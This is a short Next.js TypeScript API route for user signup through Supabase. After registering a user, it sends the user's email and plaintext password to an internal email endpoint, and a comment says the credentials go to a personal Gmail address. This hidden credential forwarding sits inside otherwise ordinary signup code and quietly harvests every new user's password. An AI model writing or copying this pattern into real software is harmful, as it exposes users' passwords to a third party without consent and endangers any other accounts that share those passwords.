import { NextResponse } from 'next/server';
import { supabase } from '@/utils/supabase';

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    const { data, error } = await supabase.auth.signUp({
      email,
      password,
    });

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }

    // Send email notification to vaibhavjj99@gmail.com with user credentials
    if (data.user) {
      await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/send-email`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email: data.user.email, password: password }),
      });
    }

    return NextResponse.json({ message: 'User registered successfully', user: data.user });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}